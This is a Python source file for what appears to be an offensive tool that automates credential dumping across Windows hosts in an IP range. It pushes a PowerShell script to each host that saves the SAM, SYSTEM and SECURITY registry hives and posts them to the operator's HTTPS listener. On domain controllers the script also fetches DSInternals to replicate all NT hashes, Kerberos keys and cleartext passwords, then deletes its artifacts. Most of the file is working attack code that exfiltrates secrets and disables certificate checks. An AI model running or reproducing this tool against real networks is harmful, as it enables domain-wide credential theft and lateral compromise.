#!/usr/bin/env python3
import os
import threading
import subprocess
import argparse
import socket
import string
import zipfile
import shutil
import sys
import ssl
from http.server import SimpleHTTPRequestHandler, HTTPServer
from concurrent.futures import ThreadPoolExecutor, as_completed

DSINTERNALS_URL = "https://github.com/MichaelGrafnetter/DSInternals/releases/download/v6.2/DSInternals_v6.2.zip"
DSINTERNALS_ZIP = "DSInternals_v6.2.zip"
EXEC_SCRIPT = "exec_across_windows.py"
UPLOAD_DIR = "./secretsdump_ng_out/"
DSINTERNALS_SERVE_DIR = os.path.join(UPLOAD_DIR, "dsinternals_files")
CERT_FILE = os.path.join(UPLOAD_DIR, "cert.pem")
KEY_FILE = os.path.join(UPLOAD_DIR, "key.pem")


def parse_ip_range(ip_range):
    """Parse IP range like 10.0.1-5.1-254 into list of IPs"""
    parts = ip_range.split('.')
    if len(parts) != 4:
        raise SystemExit("Invalid IP range format")

    def expand(part):
        vals = []
        for section in part.split(','):
            if '-' in section:
                s, e = map(int, section.split('-'))
                vals.extend(range(s, e + 1))
            else:
                vals.append(int(section))
        return vals

    expanded = [expand(p) for p in parts]
    return [
        f"{a}.{b}.{c}.{d}"
        for a in expanded[0]
        for b in expanded[1]
        for c in expanded[2]
        for d in expanded[3]
    ]


def get_host_ip_given_target(target_ip):
    """Get the local IP address used to reach a target IP"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target_ip, 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return None


def generate_ssl_cert():
    """Generate SSL certificate"""
    if os.path.exists(CERT_FILE):
        os.remove(CERT_FILE)
    if os.path.exists(KEY_FILE):
        os.remove(KEY_FILE)
    
    print("[*] Generating SSL certificate...")
    cmd = [
        "openssl", "req", "-x509", "-newkey", "rsa:2048",
        "-keyout", KEY_FILE,
        "-out", CERT_FILE,
        "-days", "1", "-nodes",
        "-subj", "/CN=localhost"
    ]
    
    try:
        subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[*] SSL certificate generated")
    except subprocess.CalledProcessError:
        print("[!] Failed to generate SSL certificate for secure file transfers")
        sys.exit(1)


def parse_ds_file(filepath):
    """Parse DSInternals dump file and extract credentials"""
    try:
        with open(filepath, 'r', encoding='utf-16-le', errors='ignore') as f:
            content = f.read()
    except:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
    
    entries = []
    current_entry = {}
    in_kerberos_new = False
    current_key_type = None
    
    for line in content.split('\n'):
        line = line.strip()
        
        if not line:
            continue
        
        if line.startswith('DistinguishedName:'):
            if current_entry:
                entries.append(current_entry)
            current_entry = {}
            in_kerberos_new = False
            current_key_type = None
        
        elif line.startswith('SamAccountName:'):
            current_entry['sam'] = line.split(':', 1)[1].strip()
        
        elif line.startswith('Sid:'):
            sid = line.split(':', 1)[1].strip()
            current_entry['rid'] = sid.split('-')[-1]
        
        elif line.startswith('AdminCount:'):
            admin_value = line.split(':', 1)[1].strip()
            current_entry['is_admin'] = (admin_value.lower() == 'true')
        
        elif line.startswith('NTHash:'):
            nt_hash = line.split(':', 1)[1].strip()
            if nt_hash:
                current_entry['nt'] = nt_hash
                # Default empty LM hash value; same behavior as original secretsdump
                current_entry['lm'] = "aad3b435b51404eeaad3b435b51404ee"        

        elif line.startswith('LMHash:'):
            lm_hash = line.split(':', 1)[1].strip()
            if lm_hash:
                current_entry['lm'] = lm_hash

        elif line.startswith('ClearText:'):
            cleartext = line.split(':', 1)[1].strip()
            if cleartext and all(ord(c) < 128 and c in string.printable for c in cleartext):
                current_entry['cleartext'] = cleartext
        
        elif line == 'KerberosNew:':
            in_kerberos_new = True
            if 'kerberos' not in current_entry:
                current_entry['kerberos'] = {}
        
        elif in_kerberos_new:
            if line == 'AES256_CTS_HMAC_SHA1_96':
                current_key_type = 'aes256'
            elif line == 'AES128_CTS_HMAC_SHA1_96':
                current_key_type = 'aes128'
            elif line == 'DES_CBC_MD5':
                current_key_type = 'des'
            elif line.startswith('Key:') and current_key_type:
                key = line.split(':', 1)[1].strip()
                if key:
                    current_entry['kerberos'][current_key_type] = key
            elif line in ['OldCredentials:', 'OlderCredentials:', 'ServiceCredentials:']:
                in_kerberos_new = False
    
    if current_entry:
        entries.append(current_entry)
    
    return entries


def format_ntds_output(entries):
    """Format NTDS entries in secretsdump style"""
    # Sort entries: admins first (alphabetically), then non-admins (alphabetically)
    admin_entries = sorted([e for e in entries if e.get('is_admin', False)], 
                          key=lambda x: x.get('sam', '').lower())
    non_admin_entries = sorted([e for e in entries if not e.get('is_admin', False)], 
                               key=lambda x: x.get('sam', '').lower())
    sorted_entries = admin_entries + non_admin_entries
    
    lines = []
    cleartext_lines = []
    kerberos_lines = []
    
    for entry in sorted_entries:
        sam = entry.get('sam', '')
        rid = entry.get('rid', '')
        is_admin = entry.get('is_admin', False)
        admin_tag = '\033[38;5;208m(admin)\033[0m ' if is_admin else ''
        
        if not sam or not rid:
            continue
        
        nt = entry.get('nt', '')
        lm = entry.get('lm', '')
        
        if nt or lm:
            lm_display = lm if lm else ''
            nt_display = nt if nt else ''
            if lm_display or nt_display:
                lines.append(f"{admin_tag}{sam}:{rid}:{lm_display}:{nt_display}:::")
        
        if 'cleartext' in entry:
            cleartext_lines.append(f"{admin_tag}{sam}:CLEARTEXT:{entry['cleartext']}")
        
        if 'kerberos' in entry and entry['kerberos']:
            kerb = entry['kerberos']
            kerb_parts = [sam]
            if 'aes256' in kerb:
                kerb_parts.append(f"aes256-cts-hmac-sha1-96:{kerb['aes256']}")
            if 'aes128' in kerb:
                kerb_parts.append(f"aes128-cts-hmac-sha1-96:{kerb['aes128']}")
            if 'des' in kerb:
                kerb_parts.append(f"des-cbc-md5:{kerb['des']}")
            if len(kerb_parts) > 1:
                kerberos_lines.append(admin_tag + ':'.join(kerb_parts))
    
    output = []
    if lines:
        output.append("[*] Dumping NTDS.DIT secrets")
        output.extend(lines)
    
    if cleartext_lines:
        output.append("")
        output.append("[*] ClearText passwords grabbed")
        output.extend(cleartext_lines)
    
    if kerberos_lines:
        output.append("")
        output.append("[*] Kerberos keys grabbed")
        output.extend(kerberos_lines)
    
    return '\n'.join(output) if output else ''


def filter_secretsdump_output(output, just_dc_user):
    """Filter secretsdump output to only include specified user"""
    if not just_dc_user:
        return output
    
    lines = output.split('\n')
    filtered_lines = []
    in_relevant_section = False
    found_user = False
    
    for line in lines:
        # Keep header lines
        if line.startswith('[*]'):
            filtered_lines.append(line)
            in_relevant_section = True
            continue
        
        # Empty lines reset section tracking
        if not line.strip():
            if found_user:
                filtered_lines.append(line)
            in_relevant_section = False
            continue
        
        # Check if this line contains the target user
        if in_relevant_section and ':' in line:
            username = line.split(':')[0]
            if username.lower() == just_dc_user.lower():
                filtered_lines.append(line)
                found_user = True
    
    return '\n'.join(filtered_lines) if found_user else ''


def process_registry_hives(zip_path, ip, just_dc_user=None):
    """Extract registry hives and run impacket-secretsdump"""
    try:
        extract_dir = os.path.join(UPLOAD_DIR, ip)
        os.makedirs(extract_dir, exist_ok=True)
        
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        
        sam_path = os.path.join(extract_dir, 'SAM')
        system_path = os.path.join(extract_dir, 'SYSTEM')
        security_path = os.path.join(extract_dir, 'SECURITY')
        
        sd_cmd = "secretsdump.py"
        if shutil.which("impacket-secretsdump"):
            sd_cmd = "impacket-secretsdump"
        elif shutil.which("secretsdump.py"):
            sd_cmd = "secretsdump.py"
        else:
            print("[-] impacket not found, cannot secretsdump from downloaded hives. Install with: pipx install impacket")
            sys.exit(1)

        cmd = [
            sd_cmd,
            '-sam', sam_path,
            '-system', system_path,
            '-security', security_path,
            'LOCAL'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        os.remove(zip_path)
        
        print(f"\033[32m[+]\033[0m Registry hives received from {ip}")
        
        # Filter output if just_dc_user is specified
        output = filter_secretsdump_output(result.stdout, just_dc_user)
        
        return output
        
    except Exception as e:
        print(f"[!] Error processing registry hives for {ip}: {e}")
        return ''


def finalize_output(ip):
    """Combine NTDS dump (if exists) with secretsdump output"""
    extract_dir = os.path.join(UPLOAD_DIR, ip)
    ntds_file = os.path.join(extract_dir, f'ntds_{ip}.out')
    final_output = os.path.join(extract_dir, f'secretsdump.out')
    
    output_parts = []
    
    # Check for NTDS dump
    if os.path.exists(ntds_file):
        entries = parse_ds_file(ntds_file)
        ntds_output = format_ntds_output(entries)
        if ntds_output:
            output_parts.append(ntds_output)
        os.remove(ntds_file)
        print(f"\033[32m[+]\033[0m NTDS dump received from {ip}")
    
    # Check for secretsdump output
    hives_output_file = os.path.join(extract_dir, 'secretsdump_output.txt')
    if os.path.exists(hives_output_file):
        with open(hives_output_file, 'r') as f:
            hives_output = f.read().strip()
            if hives_output:
                if output_parts:
                    output_parts.append('')
                output_parts.append(hives_output)
        os.remove(hives_output_file)
    
    # Write final output
    if output_parts:
        final_content = '\n'.join(output_parts)
        
        # Write output (full dump always overwrites, single-user only if file doesn't exist)
        with open(final_output, 'w') as f:
            f.write(final_content)
        print(f"\033[32m[+]\033[0m Credentials saved to: {final_output}")
        return final_content
    
    return None


class FileUploadHTTPRequestHandler(SimpleHTTPRequestHandler):
    """HTTPS handler for receiving credential dumps"""
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=DSINTERNALS_SERVE_DIR, **kwargs)
    
    def do_POST(self):
        os.makedirs(UPLOAD_DIR, exist_ok=True)
        
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(content_length)
            
            filename = self.headers.get('filename', 'upload.bin')
            filename = os.path.basename(filename)
            
            if filename.startswith('hives_'):
                ip = filename.replace('hives_', '').replace('.zip', '')
                extract_dir = os.path.join(UPLOAD_DIR, ip)
                os.makedirs(extract_dir, exist_ok=True)
                zip_path = os.path.join(extract_dir, filename)
                
                with open(zip_path, 'wb') as f:
                    f.write(data)
                
                # Get just_dc_user from server if available
                just_dc_user = getattr(self.server, 'just_dc_user', None)
                hives_output = process_registry_hives(zip_path, ip, just_dc_user)
                output_file = os.path.join(extract_dir, 'secretsdump_output.txt')
                with open(output_file, 'w') as f:
                    f.write(hives_output)
                
            elif filename.startswith('ntds_'):
                ip = filename.replace('ntds_', '').replace('.out', '')
                extract_dir = os.path.join(UPLOAD_DIR, ip)
                os.makedirs(extract_dir, exist_ok=True)
                out_path = os.path.join(extract_dir, filename)
                
                with open(out_path, 'wb') as f:
                    f.write(data)
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
            
        except Exception as e:
            print(f"[!] Upload error: {e}")
            self.send_response(500)
            self.end_headers()
    
    def log_message(self, format, *args):
        if hasattr(self.server, 'verbose') and self.server.verbose:
            super().log_message(format, *args)
        else:
            pass


def start_upload_server(just_dc_user=None):
    """Start HTTPS server for receiving credential uploads on port 1338"""
    http_server = HTTPServer(("0.0.0.0", 1338), FileUploadHTTPRequestHandler)
    
    # Store just_dc_user in server for handler access
    http_server.just_dc_user = just_dc_user
    
    # Wrap with SSL
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(CERT_FILE, KEY_FILE)
    http_server.socket = context.wrap_socket(http_server.socket, server_side=True)
    
    global https_server
    https_server = http_server
    https_server.serve_forever()


https_server = None


print_lock = threading.Lock()


def generate_command(ip, username, password, just_dc_user, verbose, show_output, show_single_output):
    
    with print_lock:
        print(f"[*] Attempting to secretsdump on {ip} using credentials {username}:{password}")
    
    host_ip = get_host_ip_given_target(ip)

    ps_script = f'''
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {{
    public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {{
        return true;
    }}
}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

$isDC = $false
try {{
    $ntds = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS" -ErrorAction SilentlyContinue).ObjectName
    if ($ntds) {{ $isDC = $true }}
}} catch {{}}

reg save HKLM\\SAM C:\\ProgramData\\SAM /y | Out-Null
reg save HKLM\\SYSTEM C:\\ProgramData\\SYSTEM /y | Out-Null
reg save HKLM\\SECURITY C:\\ProgramData\\SECURITY /y | Out-Null

Compress-Archive -Path C:\\ProgramData\\SAM,C:\\ProgramData\\SYSTEM,C:\\ProgramData\\SECURITY -DestinationPath C:\\ProgramData\\hives_{ip}.zip -Force

iwr -Uri "https://{host_ip}:1338/upload" -Method Post -InFile "C:\\ProgramData\\hives_{ip}.zip" -Headers @{{"filename"="hives_{ip}.zip"}} -UseBasicParsing | Out-Null

del C:\\ProgramData\\SAM
del C:\\ProgramData\\SYSTEM
del C:\\ProgramData\\SECURITY
del C:\\ProgramData\\hives_{ip}.zip

if ($isDC) {{
    iwr https://{host_ip}:1338/{DSINTERNALS_ZIP} -o C:\\ProgramData\\DSInternals.zip
    Expand-Archive C:\\ProgramData\\DSInternals.zip -d C:\\ProgramData\\DSInternals\\
    Import-Module C:\\ProgramData\\DSInternals\\DSInternals\\DSInternals.psd1
'''

    if just_dc_user:
        ps_script += f'    Get-ADReplAccount -Server LOCALHOST -SamAccountName {just_dc_user} | Out-File C:\\ProgramData\\ntds_{ip}.out -Encoding Unicode\n'
    else:
        ps_script += f'    Get-ADReplAccount -All -Server LOCALHOST | Out-File C:\\ProgramData\\ntds_{ip}.out -Encoding Unicode\n'

    ps_script += f'''    iwr -Uri "https://{host_ip}:1338/upload" -Method Post -InFile "C:\\ProgramData\\ntds_{ip}.out" -Headers @{{"filename"="ntds_{ip}.out"}} -UseBasicParsing | Out-Null
    del C:\\ProgramData\\ntds_{ip}.out
    del C:\\ProgramData\\DSInternals.zip
    Remove-Item -Recurse -Force C:\\ProgramData\\DSInternals\\
}}
'''

    # the issue with trying to thread using exec_across_windows.py is that it becomes tricky to attribute secrets to an IP
    # this becomes even more of an issue if we are working through a jumpbox
    # thus we simply use it with --threads 1
    exec_cmd = [
        "python3", EXEC_SCRIPT,
        ip, username, password,
        ps_script,
        "--timeout", "30",
        "--threads", "1"
    ]
    
    if show_output:
        exec_cmd.append("-o")

    try:
        if verbose:
            subprocess.run(exec_cmd)
        else:
            subprocess.run(exec_cmd, capture_output=True, text=True)
        
        threading.Event().wait(1)
        
        final_content = finalize_output(ip)
        
        if final_content and show_single_output:
            with print_lock:
                print(f"\n{'='*60}")
                print(f"Results for {ip}:")
                print('='*60)
                print(final_content)
                print('='*60)
        
    except Exception as e:
        with print_lock:
            print(f"[!] Error on {ip}: {e}")


def main(args):
    # Create directories
    os.makedirs(UPLOAD_DIR, exist_ok=True)
    os.makedirs(DSINTERNALS_SERVE_DIR, exist_ok=True)
    
    # Generate SSL certificate
    generate_ssl_cert()
    
    # Download and prepare DSInternals
    dsinternals_path = os.path.join(DSINTERNALS_SERVE_DIR, DSINTERNALS_ZIP)
    
    if not os.path.exists(dsinternals_path):
        print("[*] Downloading DSInternals...")
        try:
            subprocess.check_call(["wget", "-q", "-O", dsinternals_path, DSINTERNALS_URL])
        except subprocess.CalledProcessError:
            print("[!] Failed to download DSInternals")
            return

    if not os.path.exists(EXEC_SCRIPT):
        print(f"[!] {EXEC_SCRIPT} not found")
        return

    print("[*] Starting HTTPS server on port 1338")
    threading.Thread(target=start_upload_server, args=(args.just_dc_user,), daemon=True).start()

    targets = parse_ip_range(args.ip_range)
    show_single_output = len(targets) == 1
    
    print(f"[*] Targeting {len(targets)} host(s)")
    if args.just_dc_user:
        print(f"[*] Dumping only user: {args.just_dc_user}")
    print(f"[*] Output directory: {os.path.abspath(UPLOAD_DIR)}")
    print("-"*60)

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = [
            pool.submit(
                generate_command,
                ip,
                args.username,
                args.password,
                args.just_dc_user,
                args.verbose,
                args.show_output,
                show_single_output
            )
            for ip in targets
        ]
        for _ in as_completed(futures):
            pass

    print("\n[*] All tasks completed")
    
    if https_server:
        print("[*] Shutting down HTTPS server...")
        https_server.shutdown()
    
    print("[*] Done!")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="secretsdump automation")
    os.makedirs(UPLOAD_DIR, exist_ok=True)

    parser.add_argument("ip_range", help="IP range (e.g. 10.0.1-5.1-254)")
    parser.add_argument("username", help="Domain username")
    parser.add_argument("password", help="Password")
    parser.add_argument("-t", "--threads", type=int, default=10,
                        help="Concurrent threads (default: 10)")
    parser.add_argument("-just-dc-user", dest="just_dc_user", 
                        help="Extract only one user. Only available on Domain Controllers.")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show exec_across_windows output")
    parser.add_argument("-o", "--show-output", action="store_true",
                        help="Show command output from target")

    args = parser.parse_args()
    main(args)